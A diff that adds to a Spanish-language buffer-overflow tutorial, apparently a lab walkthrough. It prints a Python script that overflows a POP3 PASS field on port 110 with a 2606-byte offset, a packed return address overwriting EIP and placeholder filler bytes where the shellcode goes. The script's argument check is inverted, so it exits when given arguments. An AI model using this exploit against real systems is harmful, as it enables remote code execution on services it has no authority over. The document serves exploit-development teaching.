@@ -151,4 +151,43 @@ pero esto esta mal porque como es una direccion y estamos en 32 bits debe estar 
 > Ojo, en OpCodes no, es decir para buscar el opcode no se necesita. Little endian es para el procesamiento
 
 
-por lo que debemos importar una libreria `pack`
+por lo que debemos importar una libreria `pack` de `struct` quedando el codigo asi
+
+```python
+from struct import pack    #<--- para el Little Endian
+import socket
+import sys
+IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
+PORT =  110               # < --  puerto del servicio
+offset = 2606
+before_eip = b"A" * 2606
+#eip = b"B" * 4
+eip=pack("<L", 0x5f4c4d13)
+shellcode = (b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23") # <- ESP - stack pointer
+
+payload = before_eip + eip + shellcode
+
+def exploit():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
+    s.connect((IP_ADDRESS, PORT))
+    banner = s.recv(1024)
+    print(f"[+] Banner: {banner}")
+    s.send(b"USER test\r\n")
+    response = s.recv(1024)
+    print(f"[+] Response: {response}")
+    s.send(b"PASS " + payload + b"\r\n")
+    s.close()
+if __name__ == '__main__':
+    if len(sys.argv) == 3:
+        IP_ADDRESS = sys.argv[1]
+        PORT = int(sys.argv[2])
+        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
+        exit(1)
+        
+```
